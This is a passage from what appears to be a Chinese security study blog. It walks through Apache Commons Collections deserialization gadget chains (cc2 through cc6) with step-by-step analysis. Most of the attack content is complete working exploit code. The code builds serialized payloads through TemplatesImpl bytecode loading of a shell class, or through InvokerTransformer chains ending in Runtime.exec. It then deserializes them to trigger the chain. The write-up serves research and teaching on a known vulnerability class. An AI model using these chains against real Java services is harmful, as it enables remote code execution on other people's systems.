&quot;cc3&quot;);</span><br><span class="line">        Field _bytecodes = c.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        _bytecodes.setAccessible(true);</span><br><span class="line">        byte[] b = Files.readAllBytes(Paths.get(&quot;D:\\Desktop\\java\\javacc\\target\\classes\\shell.class&quot;));</span><br><span class="line">        byte[][] _b = &#123;b&#125;;</span><br><span class="line">        _bytecodes.set(templates, _b);</span><br><span class="line">        Field tfactoryField = c.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">        tfactoryField.setAccessible(true);</span><br><span class="line">        tfactoryField.set(templates,new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        Transformer[] T = &#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer transform = new ChainedTransformer(T);</span><br><span class="line">        HashMap&lt;Object,Object&gt; m = new HashMap();</span><br><span class="line">        Map&lt;Object,Object&gt; m2 = LazyMap.decorate(m,transform);</span><br><span class="line">        Class r = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor constructor = r.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line">        InvocationHandler h = (InvocationHandler) constructor.newInstance(Override.class,m2);</span><br><span class="line">        Map o1 = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]&#123;Map.class&#125;,h);</span><br><span class="line">        Object o2 = constructor.newInstance(Override.class, o1);</span><br><span class="line">        serialize(o2);</span><br><span class="line">        deserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object object) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object deserialize(String filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">        return objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://xz.aliyun.com/news/12492">https://xz.aliyun.com/news/12492</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>cc链</category>
      </categories>
  </entry>
  <entry>
    <title>cc链4</title>
    <url>/posts/eee0ae52/</url>
    <content><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>和cc链2一个环境</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>cc链4就是cc3和cc2的结合（个人认为）直接贴exp了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections4.Transformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class cc4 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        Class aClass = templates.getClass();</span><br><span class="line">        Field _name = aClass.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        _name.setAccessible(true);</span><br><span class="line">        _name.set(templates, &quot;cc4&quot;);</span><br><span class="line">        byte[] b = Files.readAllBytes(Paths.get(&quot;D:\\Desktop\\java\\javacc\\target\\classes\\shell.class&quot;));</span><br><span class="line">        byte[][] b1 = &#123;b&#125;;</span><br><span class="line">        Field b2 = aClass.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        b2.setAccessible(true);</span><br><span class="line">        b2.set(templates, b1);</span><br><span class="line"></span><br><span class="line">        Field f = aClass.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">        f.setAccessible(true);</span><br><span class="line">        f.set(templates, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        Transformer[] T = &#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(T);</span><br><span class="line"></span><br><span class="line">        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);</span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue(111);</span><br><span class="line">        priorityQueue.add(1);</span><br><span class="line">        priorityQueue.add(2);</span><br><span class="line">        Class aClass1 = priorityQueue.getClass();</span><br><span class="line">        Field ca = aClass1.getDeclaredField(&quot;comparator&quot;);</span><br><span class="line">        ca.setAccessible(true);</span><br><span class="line">        ca.set(priorityQueue, transformingComparator);</span><br><span class="line">        seriliaze(priorityQueue);</span><br><span class="line">        unserilize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void seriliaze(Object o) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserilize(String filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">        return objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>cc链</category>
      </categories>
  </entry>
  <entry>
    <title>cc链5</title>
    <url>/posts/99e79ec4/</url>
    <content><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>和cc1一样</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>尾部的命令执行部分，和cc链1一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class c = Runtime.class;</span><br><span class="line"></span><br><span class="line">        Transformer[] T = &#123;</span><br><span class="line">        new ConstantTransformer(c),</span><br><span class="line">        new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(T);</span><br><span class="line">        Map&lt;Object,Object&gt; map = new HashMap();</span><br><span class="line">        Map map1  = LazyMap.decorate(map, chainedTransformer);</span><br></pre></td></tr></table></figure>

<p>只是对LazyMap的的get方法调用换了方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TiedMapEntry tiedMapEntry = new TiedMapEntry(map1, &quot;111&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/99e79ec4/1761551675905-433b7439-a21f-482c-b8a5-abbbba6da851.png" alt="img"></p>
<p>这里选择了TideMapEntry类的getValue方法调用了get</p>
<p><img src="/posts/99e79ec4/1761551741261-919d4428-0be5-4795-b089-84733317ec29.png" alt="img"></p>
<p>tostring方法调用了getValue方法</p>
<p>toString方法是在BadAttributeValueExpException中调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);</span><br><span class="line">        Class m = BadAttributeValueExpException.class;</span><br><span class="line">        Field f = m.getDeclaredField(&quot;val&quot;);</span><br><span class="line">        f.setAccessible(true);</span><br><span class="line">        f.set(badAttributeValueExpException, tiedMapEntry);</span><br></pre></td></tr></table></figure>

<p>这里传入null的作用是</p>
<p><img src="/posts/99e79ec4/1761552084033-b4d961af-c30c-448c-a641-b0d7c663a035.png" alt="img"></p>
<p>防止提前执行（利用反射，类似urlDNS链）</p>
<p>整体</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import static org.apache.commons.collections.map.LazyMap.*;</span><br><span class="line"></span><br><span class="line">public class cc5 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Class c = Runtime.class;</span><br><span class="line"></span><br><span class="line">        Transformer[] T = &#123;</span><br><span class="line">        new ConstantTransformer(c),</span><br><span class="line">        new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(T);</span><br><span class="line">        Map&lt;Object,Object&gt; map = new HashMap();</span><br><span class="line">        Map map1  = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(map1, &quot;111&quot;);</span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);</span><br><span class="line">        Class m = BadAttributeValueExpException.class;</span><br><span class="line">        Field f = m.getDeclaredField(&quot;val&quot;);</span><br><span class="line">        f.setAccessible(true);</span><br><span class="line">        f.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line">        searilize(badAttributeValueExpException);</span><br><span class="line">        unsearilize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//        Class c = Runtime.class;</span><br><span class="line">//        Method m = c.getDeclaredMethod(&quot;getRuntime&quot;,null);</span><br><span class="line">//        m.setAccessible(true);</span><br><span class="line">//        Object o = m.invoke(null,null);</span><br><span class="line">//        Method m2 = c.getDeclaredMethod(&quot;exec&quot;,String.class);</span><br><span class="line">//        m2.setAccessible(true);</span><br><span class="line">//        m2.invoke(o,&quot;calc&quot;);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void searilize(Object o) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object unsearilize(String s) throws Exception &#123;</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(s));</span><br><span class="line">        return objectInputStream.readObject();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>cc链</category>
      </categories>
  </entry>
  <entry>
    <title>cc链2</title>
    <url>/posts/7830b67/</url>
    <content><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">       &lt;dependency&gt;</span><br><span class="line">           &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">           &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">           &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">       &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">       &lt;dependency&gt;</span><br><span class="line">           &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">           &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">           &lt;version&gt;3.22.0-GA&lt;/version&gt;</span><br><span class="line">       &lt;/dependency&gt;</span><br><span class="line">   &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>

<p>jdk版本还是使用的jdk8u65</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class c = Runtime.class;</span><br><span class="line">      Transformer[] t = new Transformer[] &#123;</span><br><span class="line">              new ConstantTransformer(c),</span><br><span class="line">              new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">              new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">              new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">      &#125;;</span><br><span class="line">      ChainedTransformer chainedTransformer =  new ChainedTransformer(t);</span><br></pre></td></tr></table></figure>

<p>开头的链子依旧不变，而调用transform的类变了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/7830b67/1760576199863-86487bef-5dba-416f-886e-c1e4832d8caf.png" alt="img"></p>
<p>会执行两次，但终归会执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PriorityQueue priorityQueue = new PriorityQueue(1); //在下面对应</span><br><span class="line">priorityQueue.add(1);</span><br><span class="line">priorityQueue.add(2);</span><br></pre></td></tr></table></figure>

<p>再来看是谁调用了compare</p>
<p><img src="/posts/7830b67/1760577094668-0f4dcaf6-b899-4601-83d4-7f34d7782209.png" alt="img"></p>
<p>在向前跟找到</p>
<p><img src="/posts/7830b67/1760577112754-177e0c38-0af5-4d23-9e8e-507e691c8b96.png" alt="img"></p>
<p>在跟到</p>
<p><img src="/posts/7830b67/1760576994786-59cad55a-2f0f-418a-9c8a-56e1b7c45071.png" alt="img"></p>
<p>总的来说这边size要大于等于2才能对sift进行调用所以要add两个，但是调用了add就会出现一个问题</p>
<p>我们来看一下</p>
<p><img src="/posts/7830b67/1760577211567-41c0bebf-4085-4e4c-9670-e8a121966e28.png" alt="img"></p>
<p><img src="/posts/7830b67/1760577229396-cf6b9ba3-5f1d-4968-9b3f-ac3cb83b4713.png" alt="img"></p>
<p><img src="/posts/7830b67/1760577244665-8695087d-ab8f-46d1-8a9b-2fa15fe28085.png" alt="img"><img src="/posts/7830b67/1760577260450-9e9248f2-80de-4114-a7fc-151eea447c91.png" alt="img"></p>
<p>会提前调用并且执行，那我们想办法绕过让comparator为空就行了</p>
<p><img src="/posts/7830b67/1760577385418-44bf5d74-26b8-448c-8b17-788355dc2cb7.png" alt="img"></p>
<p>传入一个整数即可。然后在使用反射将comparator的值赋值为priorityQueue，具体为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class aClass = priorityQueue.getClass();</span><br><span class="line">        Field f = aClass.getDeclaredField(&quot;comparator&quot;);</span><br><span class="line">        f.setAccessible(true);</span><br><span class="line">        f.set(priorityQueue, transformingComparator);</span><br><span class="line">        seriliaze(priorityQueue);</span><br><span class="line">        unserilize(&quot;ser.bin&quot;);</span><br></pre></td></tr></table></figure>

<p>然后在跟的话，谁调用了heapify正好是readobject，结束</p>
<p><img src="/posts/7830b67/1760577574941-e96229a4-e2c5-4bfc-b83e-c19de5c6dcca.png" alt="img"></p>
<p>整体exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections4.Transformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.AbstractQueue;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class cc2 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Class c = Runtime.class;</span><br><span class="line">        Transformer[] t = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(c),</span><br><span class="line">                new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer =  new ChainedTransformer(t);</span><br><span class="line">        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);</span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);</span><br><span class="line">        priorityQueue.add(1);</span><br><span class="line">        priorityQueue.add(2);</span><br><span class="line">        Class aClass = priorityQueue.getClass();</span><br><span class="line">        Field f = aClass.getDeclaredField(&quot;comparator&quot;);</span><br><span class="line">        f.setAccessible(true);</span><br><span class="line">        f.set(priorityQueue, transformingComparator);</span><br><span class="line">        seriliaze(priorityQueue);</span><br><span class="line">        unserilize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//        Method getDeclaredMethod = (Method) new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(c);</span><br><span class="line">//        Object invoke = new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getDeclaredMethod);</span><br><span class="line">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(invoke);</span><br><span class="line"></span><br><span class="line">//        Method getRuntime = c.getDeclaredMethod(&quot;getRuntime&quot;,null);</span><br><span class="line">//        getRuntime.setAccessible(true);</span><br><span class="line">//       Object o = getRuntime.invoke(null,null);</span><br><span class="line">//       Method exec = c.getDeclaredMethod(&quot;exec&quot;,String.class);</span><br><span class="line">//        exec.setAccessible(true);</span><br><span class="line">//        exec.invoke(o,&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void seriliaze(Object o) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object unserilize(String filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">        return objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>啊嘞啊嘞，上面写的好像有问题（不好意思），学cc11的时候发现了，emmmmm和cc3前半段差不多使用TemplatesImpl类里的方法进行类加载，和cc4的区别在于，cc2使用的是InvokerTransformer代替TrAXFilter+InstantiateTransformer来执行newTransformer()方法</p>
<p>贴住exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections4.Transformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line">import sun.invoke.anon.AnonymousClassLoader;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class cc2_2 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        Class aClass = templates.getClass();</span><br><span class="line">        Field name = aClass.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        name.setAccessible(true);</span><br><span class="line">        name.set(templates, &quot;cc2&quot;);</span><br><span class="line">        byte[] b = Files.readAllBytes(Paths.get(&quot;D:\\Desktop\\java\\javacc\\target\\classes\\shell.class&quot;));</span><br><span class="line">        byte[][] b1 = &#123;b&#125;;</span><br><span class="line">        Field b2 = aClass.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        b2.setAccessible(true);</span><br><span class="line">        b2.set(templates, b1);</span><br><span class="line"></span><br><span class="line">        Field f = aClass.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">        f.setAccessible(true);</span><br><span class="line">        f.set(templates, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        Transformer[] T = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(templates),</span><br><span class="line">                new InvokerTransformer(&quot;newTransformer&quot;,null,null)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(T);</span><br><span class="line">        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);</span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue(1111);</span><br><span class="line">        priorityQueue.add(1);</span><br><span class="line">        priorityQueue.add(2);</span><br><span class="line">        Class bClass = priorityQueue.getClass();</span><br><span class="line">        Field f1 = bClass.getDeclaredField(&quot;comparator&quot;);</span><br><span class="line">        f1.setAccessible(true);</span><br><span class="line">        f1.set(priorityQueue, transformingComparator);</span><br><span class="line">        seriliaze(priorityQueue);</span><br><span class="line">        unserilize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void seriliaze(Object o) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object unserilize(String filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">        return objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>cc链</category>
      </categories>
  </entry>
  <entry>
    <title>cc链6</title>
    <url>/posts/eecf7e/</url>
    <content><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>因为cc链6和cc1的尾部相同只是触发的起点不同，所以我使用的是cc1的环境</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这次我们从按着代码顺序来逐步分析</p>
<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class c = Runtime.class;</span><br><span class="line">    Transformer[] t = new Transformer[]&#123;</span><br><span class="line">            new ConstantTransformer(c),</span><br><span class="line">            new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(t);</span><br></pre></td></tr></table></figure>

<p>依旧是从Transformer接口开始来调用三个实现类，分别ConstantTransformer（调用transform返回的是构造函数传入的值），InvokerTransformer（反射调用执行命令）和ChainedTransformer（可以让数组里的对象循环调用transform方法），使用反射调用的理由也很简单，因为Runtime类是无法进行反序列化的，必须使用Class对象进行反序列化，这里也要利用到反射（cc1应该提到过）。</p>
<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map m = new HashMap();</span><br><span class="line">LazyMap decorate = (LazyMap) LazyMap.decorate(m, chainedTransformer);</span><br></pre></td></tr></table></figure>

<p>我们要找是谁调用transform方法的类，这里找到的是LazyMap类（它的get方法调用了transform方法），和cc1链的第二种写法一致，定义一个Map然后使用lazymap类的decorate方法进行实例化</p>
<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, new String());</span><br></pre></td></tr></table></figure>

<p>接着找是谁调用了get方法，我们这里找到了TiedMapEntry类里的getvalue方法，那么谁有调用了getvalue方法呢，是这个类的hashcode方法，对hashcode的调用又回到了，我们学习反射时调用的第一条dns链了</p>
<h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap map = new HashMap();</span><br><span class="line">Class ti = tiedMapEntry.getClass();</span><br><span class="line">    Field map1 = ti.getDeclaredField(&quot;map&quot;);</span><br><span class="line">    map1.setAccessible(true);</span><br><span class="line">    map1.set(tiedMapEntry, new HashMap());</span><br><span class="line"></span><br><span class="line">    map.put(tiedMapEntry, &quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">    map1.set(tiedMapEntry, decorate);</span><br></pre></td></tr></table></figure>

<p>这样我们就可以重写Hashmap类的readobject方法，来调用hash函数来调用hashcode，至此这条链子就分析结束了，但是有一个问题是和dns链相同的问题，就是我们必须使用put来传值，使整个链子得到调用，但是put会调用hash方法继而调用hashcode（这里会调用是因为key），也就是说，链子不在反序列化时调用而是会提前调用。</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>问题呢就是</p>
<p><img src="/posts/eecf7e/1759480479076-81ce24af-babd-4297-9db0-62617e152cfb.png" alt="img"></p>
<p>这边不为空，不为空的原因也很简单</p>
<p><img src="/posts/eecf7e/1759480658874-f68027c0-06e2-404c-8c74-24e8777dfb70.png" alt="img"></p>
<p>这里传了一个对象也就是tiedMapEntry的map属性是有值的就是decorate</p>
<p><img src="/posts/eecf7e/1759479415152-939c8106-3fed-4c09-a4a6-d8432034280c.png" alt="img"></p>
<p>所以会提前触发，要解决它，我们只要在put时不触发hashcode就行，所以要让key为空</p>
<p>所以我们直接给他一个空的hashmap实例就可以让他为空</p>
<p><img src="/posts/eecf7e/1759481694310-00a86640-9e67-45bf-b150-66e1c5a19f4f.png" alt="img"></p>
